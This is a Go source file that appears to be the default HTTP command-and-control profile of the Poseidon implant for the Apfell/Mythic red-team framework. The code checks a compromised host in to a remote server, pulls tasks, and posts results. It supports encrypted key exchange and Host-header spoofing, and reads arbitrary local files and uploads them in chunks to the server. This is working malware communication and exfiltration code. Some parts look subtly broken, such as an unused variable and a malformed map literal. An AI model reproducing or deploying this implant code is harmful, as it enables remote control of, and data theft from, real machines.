// +build default

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type C2Default struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Default{}
}

//CheckIn a new agent
func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
	var resp []byte
	// Use dynamic JSON

	checkin := structs.Msg{"action": "checkin", "user": user, "host": host, "ip": ip, "pid": pid, "uuid": c.UUID}

	/*checkin := structs.CheckInStruct{}
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID*/
	if functions.IsElevated() {
		checkin["integrity_level"] = 3
	} else {
		checkin["integrity_level"] = 2
	}

	checkinMsg, _ := json.Marshal(checkin)
	//log.Printf("Sending checkin msg: %+v\n", checkin)
	// If exchangingKeys == true, then start EKE
	if c.ExchangingKeys {
		sID := c.NegotiateKey()

		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
		resp = c.htmlPostData(endpoint, checkinMsg)

	} else if len(c.AesPSK) != 0 {
		// If we're using a static AES key, then just hit the aes_psk endpoint
		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
		resp = c.htmlPostData(endpoint, checkinMsg)
	} else {
		// If we're not using encryption, we hit the callbacks endpoint directly
		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
		resp = c.htmlPostData(endpoint, checkinMsg)
		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
	}

	// save the apfell id
	respMsg := structs.CheckinResponse{}
	err := json.Unmarshal(resp, &respMsg)
	//log.Printf("Raw response: %s", string(resp))
	if err != nil {
		log.Println("message:\n", string(resp))
		log.Printf("Error in unmarshal:\n %s", err.Error())
	}

	//log.Printf("Received ApfellID: %+v\n", c)
	return respMsg
}

//GetTasking - retrieve new tasks
func (c *C2Default) GetTasking() interface{} {
	//log.Printf("Current C2Default config: %+v\n", c)
	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
	rawTask := c.htmlGetData(url)
	//log.Println("Raw HTMLGetData response: ", string(rawTask))
	task := structs.Task{}
	err := json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
	urlEnding := fmt.Sprintf("api/v%s/responses/%s", ApiVersion, task.ID)
	return c.postRESTResponse(urlEnding, []byte(output))
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer

	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		dataToSend, _ := json.Marshal(tResp)
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", c.BaseURL, urlEnding)
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.AesPSK) != 0 {
		//sendData = EncryptMessage(sendData, c.AesPreSharedKey())
		sendData = c.encryptMessage(sendData)
	}

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	req.Header.Set("User-Agent", c.GetUserAgent())
	// Set the host header if not empty
	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader
	}

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		//log.Printf("Error completing POST request %s", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Printf("Did not receive 200 response code: %s", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		//log.Printf("Error reading response body: %s", err.Error())
		return make([]byte, 0)
	}
	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//log.Printf("C2Default config in if: %+v\n", c)
		return c.decryptMessage(body)
	}

	return body
}

//htmlGetData - HTTP GET request for data
func (c *C2Default) htmlGetData(url string) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	client := &http.Client{}
	var respBody []byte

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Sprintf("Error completing GET request: %s", err)
		//log.Println("Error completing GET request: ", err.Error())
		return make([]byte, 0)
	}

	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader
	}

	req.Header.Set("User-Agent", c.GetUserAgent())
	resp, err := client.Do(req)

	if err != nil {
		//log.Println("Error completing GET request: ", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Println("Did not receive 200 response code: ", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	respBody, _ = ioutil.ReadAll(resp.Body)

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		return c.decryptMessage(respBody)
	}

	return respBody

}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.Msg{
		"action": "staging_rsa",
		"SESSIONID": sessionID,
		"PUB": base64.StdEncoding.EncodeToString(pub)
	}

	// Encode and encrypt the json message
	rawMsg, err := json.Marshal(initMessage)

	if err != nil {
		return ""
	}

	// Send the request to the EKE endpoint
	endpoint := fmt.Sprintf("api/v%s/crypto/EKE/%s", ApiVersion, c.UUID)

	resp := c.htmlPostData(endpoint, rawMsg)
	// Decrypt & Unmarshal the response

	decResp, _ := base64.StdEncoding.DecodeString(string(resp))
	decryptedResponse := crypto.RsaDecryptCipherBytes(decResp, c.RsaKey())
	sessionKeyResp := structs.SessionKeyResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		return ""
	}

	// Save the new AES session key
	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
	c.SetXKeys(false)
	return sessionID
}

//SendFile - download a file
func (c *C2Default) SendFile(task structs.Task, params string) {
	//response := TaskResponse{}
	fileReq := structs.FileRegisterRequest{}
	fileReq.Task = task.ID
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		tMsg := structs.ThreadMsg{}
		tMsg.Error = true
		tMsg.TaskItem = task
		tMsg.TaskResult = []byte(err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	file.Read(raw)

	c.SendFileChunks(task, raw)
}

// Get a file

func (c *C2Default) GetFile(fileid string) []byte {
	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", fileid, c.ApfellID)
	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))

	//decFileData := c.decryptMessage(encfileData)
	if len(encfileData) > 0 {
		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
		return rawData
	}

	return make([]byte, 0)
}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileRegisterRequest{}
	chunkResponse.Chunks = int(chunks)
	chunkResponse.Task = task.ID

	msg, _ := json.Marshal(chunkResponse)
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.FileRegisterResponse{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {

		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileChunk{}
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.ChunkNumber = int(i) + 1
		msg.FileID = fileResp.FileID

		encmsg, _ := json.Marshal(msg)
		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
		dataToSend, _ := json.Marshal(tResp)

		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
		resp := c.htmlPostData(endpoint, dataToSend)
		postResp := structs.FileChunkResponse{}
		_ = json.Unmarshal(resp, &postResp)

		if !strings.Contains(postResp.Status, "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.htmlPostData(endpoint, encmsg)
		}
		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	c.PostResponse(task, "file downloaded")
}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
	return crypto.AesDecrypt(key, decMsg)
}
